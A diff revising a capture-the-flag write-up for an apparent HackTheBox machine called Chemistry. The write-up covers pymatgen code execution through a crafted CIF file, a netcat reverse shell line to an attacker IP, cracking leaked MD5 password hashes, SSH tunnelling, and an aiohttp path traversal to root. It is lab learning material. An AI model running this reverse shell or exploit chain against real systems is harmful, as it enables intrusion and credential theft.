@@ -9,7 +9,7 @@
 
 <br><br>
 
-Our inital nmap scans reveals two ports open, 22 and 5000.
+The inital nmap scans reveals two ports open, 22 and 5000.
 
 <br><br>
 
@@ -40,18 +40,22 @@ Our inital nmap scans reveals two ports open, 22 and 5000.
 
 
 <br><br>
-The application provided at port 5000 looks like a parser for *Crystallographic Information Files (CIF)*.
+
+The application hosted on the box at port 5000 looks like a parser for *Crystallographic Information Files (CIF)*.
+
 <br><br>
+
 ![Pasted image 20241023002915-1](https://github.com/user-attachments/assets/b84120fa-fbe7-4534-844a-105686aa94f8)
 
 <br><br>
-Surfing the web we find the recent *CVE-2024-23346* 
+
+Surfing the web i find the recent *CVE-2024-23346* 
 
 https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0
 
 A vulnerability in the parsing library *Pymatgen versions prior to 2024.2.8*, that executes arbitrary code via *insecure serializazion*.
 
-All we need to do is craft a malicious .cif file, and then inject the command we want to execute in it. We have a template of the file's structure in the link above:
+All you need to do is craft a malicious .cif file, and then inject the command you want to execute in it. We have a template of the file's structure in the link above:
 
 <br><br>
 
@@ -81,13 +85,16 @@ All we need to do is craft a malicious .cif file, and then inject the command we
 > 
 
 <br><br>
-Experimenting with an active handler and a series of bash payloads from https://www.revshells.com/, we find the right one to be:
+
+Experimenting with an active handler and a series of bash payloads from https://www.revshells.com/, i find the right one to be:
+
 <br><br>
+
 > *busybox nc 10.10.15.56 1337 -e sh*
 
 <br><br>
 
-Which allows us to gain a reverse shell:
+Which allows me to gain a reverse shell:
 
 <br><br>
 
@@ -96,7 +103,8 @@ Which allows us to gain a reverse shell:
 
 <br><br>
 
-Checking the app's directory, we're able to retrieve the .db database that has stored all the *user's md5 hashes*, encoded with the following algorythm, as we can read in the *app.py* file.
+Checking the app's directory, i'm able to retrieve the .db database that has stored all the *users passwords md5 hashes*, encoded with the following algorythm, as i can read in the *app.py* file.
+
 <br><br>
 
 >    hashed_password = hashlib.md5(password.encode()).hexdigest()
@@ -111,7 +119,7 @@ Checking the app's directory, we're able to retrieve the .db database that has s
 
 <br><br>
 
-A rapid visit to https://crackstation.net reveals us the cleartext password of rosa's user:
+A quick hop to https://crackstation.net reveals me the cleartext password of rosa's user:
 
 <br><br>
 
@@ -119,7 +127,7 @@ A rapid visit to https://crackstation.net reveals us the cleartext password of r
 
 <br><br>
 
-This is our initial foothold on the machine. We have credentials to access ssh:
+I get an initial foothold on the machine. I have credentials to access ssh:
 
 <br><br>
 
@@ -127,7 +135,7 @@ This is our initial foothold on the machine. We have credentials to access ssh:
 
 <br><br>
 
-Running linpeas.sh on the machine, we find out a *service listening on port 8080* of localhost
+Running linpeas.sh on the machine, i find out a *service listening on port 8080*, localhost
 
 <br><br>
 
@@ -135,7 +143,7 @@ Running linpeas.sh on the machine, we find out a *service listening on port 8080
 
 <br><br>
 
-To enumerate this service, we perform an *SSH tunneling* to our host, using the following command:
+To enumerate this service, i make up an *SSH tunneling* to our remote host, using the following command:
 
 <br><br>
 
@@ -143,8 +151,10 @@ To enumerate this service, we perform an *SSH tunneling* to our host, using the 
 
 <br><br>
 
-This forwards *our localhost's* port 8080 to port 8080 running on 127.0.0.1 (localhost) remote machine.
-A rapid nmap scan shows us that Chemistry is running *aiohttp 3.9.1*
+This forwards *my local* 8080 port  to the remote machine's local 8080 port. 
+(Attacking Box 127.0.0.1:8080 ----> Victim Box 127.0.0.1:8080)
+This means that i can direct external traffic, like a scan or even access the service from a browser if possible, to an internal service on a remote machine that otherwise would be accessible only from the box itself.
+Nmap shows me that Chemistry is running *aiohttp 3.9.1*
 
 <br><br>
 
@@ -160,7 +170,7 @@ https://github.com/z3rObyte/CVE-2024-23334-PoC
 
 <br><br>
 
-It looks like aiohttp software it is vulnerable to *path traversal* up to version *3.9.1*. We're going to modify a bit the script to make it run on *our* localhost's port 8080 and try to read *root's flag*. 
+It looks like aiohttp software it is vulnerable to *path traversal* up to version *3.9.1*. I'm going to modify a bit the script to make it run on *my* localhost's port 8080 and redirecting the exploit to the internal service, trying to read *root's flag*. 
 
 <br><br>
 
@@ -176,4 +186,4 @@ And...
 
 <br><br>
 
-Success! We have code execution as root user!
+Success! I have partial root access that can be leveraged to a shell and eventual full compromise of the box!
